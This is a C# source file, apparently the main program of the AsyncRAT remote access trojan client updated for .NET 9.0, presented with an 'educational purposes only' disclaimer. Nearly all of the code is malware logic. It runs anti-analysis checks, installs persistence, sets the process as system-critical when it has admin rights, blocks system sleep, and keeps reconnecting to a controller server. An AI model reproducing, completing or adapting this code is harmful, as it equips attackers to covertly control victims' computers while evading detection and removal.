using System.Diagnostics;
using Client.Connection;
using Client.Install;
using Client.Helper;
using Microsoft.Extensions.Logging;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;

/* 
       │ Author       : NYAN CAT
       │ Name         : AsyncRAT Simple RAT Client (.NET 9.0)
       │ Contact Me   : https://github.com/NYAN-x-CAT

       This program is distributed for educational purposes only.
*/

// Configure services for .NET 9.0 client
using var host = Host.CreateDefaultBuilder(args)
    .ConfigureServices(services =>
    {
        services.AddLogging(builder =>
        {
            builder.AddEventLog();
            builder.AddDebug();
            builder.SetMinimumLevel(LogLevel.Warning); // Client logs less verbosely
        });
        services.AddSingleton<IClientLogger, ClientLogger>();
    })
    .Build();

var logger = host.Services.GetRequiredService<IClientLogger>();
var cancellationTokenSource = new CancellationTokenSource();

// Set up global exception handling
AppDomain.CurrentDomain.UnhandledException += (sender, e) => HandleUnhandledException(e, logger);

try
{
    // Initialize settings first
    if (!await InitializeSettingsAsync(logger))
    {
        await SafeExitAsync(1, logger);
        return;
    }

    // Apply startup delay if configured
    await ApplyStartupDelayAsync(logger, cancellationTokenSource.Token);

    // Run security and installation checks
    if (!await RunSecurityChecksAsync(logger))
    {
        await SafeExitAsync(0, logger);
        return;
    }

    // Main connection loop
    await RunMainLoopAsync(logger, cancellationTokenSource.Token);
}
catch (Exception ex)
{
    await logger.LogAsync(LogLevel.Critical, $"Critical error in main: {ex.Message}", ex);
    await SafeExitAsync(1, logger);
}

// Local functions for .NET 9.0 style
static async Task<bool> InitializeSettingsAsync(IClientLogger logger)
{
    try
    {
        var result = Settings.InitializeSettings();
        await logger.LogAsync(LogLevel.Information, $"Settings initialization: {(result ? "Success" : "Failed")}");
        return result;
    }
    catch (Exception ex)
    {
        await logger.LogAsync(LogLevel.Error, $"Failed to initialize settings: {ex.Message}", ex);
        return false;
    }
}

static async Task ApplyStartupDelayAsync(IClientLogger logger, CancellationToken cancellationToken)
{
    try
    {
        int delay = Settings.GetIntegerSetting(Settings.Delay, 0, 0, 300); // Max 5 minutes
        if (delay > 0)
        {
            await logger.LogAsync(LogLevel.Debug, $"Applying startup delay: {delay} seconds");
            
            using var delayTimer = new PeriodicTimer(TimeSpan.FromSeconds(1));
            for (int i = 0; i < delay && !cancellationToken.IsCancellationRequested; i++)
            {
                await delayTimer.WaitForNextTickAsync(cancellationToken);
            }
        }
    }
    catch (Exception ex)
    {
        await logger.LogAsync(LogLevel.Warning, $"Error applying startup delay: {ex.Message}", ex);
        // Continue execution even if delay fails
    }
}

static async Task<bool> RunSecurityChecksAsync(IClientLogger logger)
{
    try
    {
        // Check for duplicate instances
        if (!MutexControl.CreateMutex())
        {
            await logger.LogAsync(LogLevel.Information, "Duplicate instance detected, exiting");
            return false;
        }

        // Run anti-analysis if enabled
        if (Settings.GetBooleanSetting(Settings.Anti))
        {
            try
            {
                Anti_Analysis.RunAntiAnalysis();
                await logger.LogAsync(LogLevel.Debug, "Anti-analysis checks completed");
            }
            catch (Exception ex)
            {
                await logger.LogAsync(LogLevel.Warning, $"Anti-analysis check failed: {ex.Message}", ex);
                // Continue execution even if anti-analysis fails
            }
        }

        // Install persistence if enabled
        if (Settings.GetBooleanSetting(Settings.Install))
        {
            try
            {
                NormalStartup.Install();
                await logger.LogAsync(LogLevel.Debug, "Installation completed");
            }
            catch (Exception ex)
            {
                await logger.LogAsync(LogLevel.Warning, $"Installation failed: {ex.Message}", ex);
                // Continue execution even if installation fails
            }
        }

        // Set critical process if enabled and admin
        if (Settings.GetBooleanSetting(Settings.BDOS) && Methods.IsAdmin())
        {
            try
            {
                ProcessCritical.Set();
                await logger.LogAsync(LogLevel.Debug, "Critical process flag set");
            }
            catch (Exception ex)
            {
                await logger.LogAsync(LogLevel.Warning, $"Failed to set critical process: {ex.Message}", ex);
                // Continue execution even if critical process setting fails
            }
        }

        // Prevent system sleep
        try
        {
            Methods.PreventSleep();
            await logger.LogAsync(LogLevel.Debug, "Sleep prevention activated");
        }
        catch (Exception ex)
        {
            await logger.LogAsync(LogLevel.Warning, $"Failed to prevent sleep: {ex.Message}", ex);
            // Continue execution even if sleep prevention fails
        }

        return true;
    }
    catch (Exception ex)
    {
        await logger.LogAsync(LogLevel.Error, $"Security checks failed: {ex.Message}", ex);
        return false;
    }
}

static async Task RunMainLoopAsync(IClientLogger logger, CancellationToken cancellationToken)
{
    int consecutiveFailures = 0;
    const int maxConsecutiveFailures = 10;
    const int baseRetryDelay = 5000; // 5 seconds

    await logger.LogAsync(LogLevel.Information, "Starting main connection loop");

    using var retryTimer = new PeriodicTimer(TimeSpan.FromMilliseconds(baseRetryDelay));
    
    while (!cancellationToken.IsCancellationRequested)
    {
        try
        {
            if (!ClientSocket.IsConnected)
            {
                try
                {
                    ClientSocket.Reconnect();
                    ClientSocket.InitializeClient();
                    
                    if (ClientSocket.IsConnected)
                    {
                        consecutiveFailures = 0; // Reset failure counter on successful connection
                        await logger.LogAsync(LogLevel.Information, "Connection established successfully");
                    }
                }
                catch (Exception ex)
                {
                    consecutiveFailures++;
                    await logger.LogAsync(LogLevel.Warning, $"Connection attempt {consecutiveFailures} failed: {ex.Message}", ex);
                    
                    // If too many consecutive failures, implement exponential backoff
                    if (consecutiveFailures >= maxConsecutiveFailures)
                    {
                        int backoffDelay = Math.Min(
                            baseRetryDelay * (int)Math.Pow(2, Math.Min(consecutiveFailures - maxConsecutiveFailures, 5)), 
                            300000); // Max 5 minutes
                        
                        await logger.LogAsync(LogLevel.Information, $"Too many consecutive failures, backing off for {backoffDelay}ms");
                        await Task.Delay(backoffDelay, cancellationToken);
                    }
                }
            }
        }
        catch (Exception ex)
        {
            await logger.LogAsync(LogLevel.Error, $"Error in main loop: {ex.Message}", ex);
            consecutiveFailures++;
        }

        // Standard retry delay
        if (!cancellationToken.IsCancellationRequested)
        {
            await retryTimer.WaitForNextTickAsync(cancellationToken);
        }
    }

    await logger.LogAsync(LogLevel.Information, "Main connection loop ended");
}

static void HandleUnhandledException(UnhandledExceptionEventArgs e, IClientLogger logger)
{
    var exception = e.ExceptionObject as Exception;
    _ = Task.Run(async () => await logger.LogAsync(LogLevel.Critical, 
        $"Unhandled exception: {exception?.Message ?? "Unknown error"}", exception));
    
    if (e.IsTerminating)
    {
        _ = Task.Run(async () =>
        {
            Methods.ClientOnExit();
            await logger.LogAsync(LogLevel.Information, "Application terminating due to unhandled exception");
        });
    }
}

static async Task SafeExitAsync(int exitCode, IClientLogger logger)
{
    try
    {
        Methods.ClientOnExit();
        await logger.LogAsync(LogLevel.Information, $"Application exiting with code: {exitCode}");
    }
    catch (Exception ex)
    {
        await logger.LogAsync(LogLevel.Warning, $"Error during cleanup: {ex.Message}", ex);
    }
    finally
    {
        Environment.Exit(exitCode);
    }
}

// Global state for managing shutdown
namespace Client
{
    public static class GlobalState
    {
        private static volatile bool _shouldExit = false;

        public static bool ShouldExit => _shouldExit;

        public static void RequestExit()
        {
            _shouldExit = true;
        }
    }
}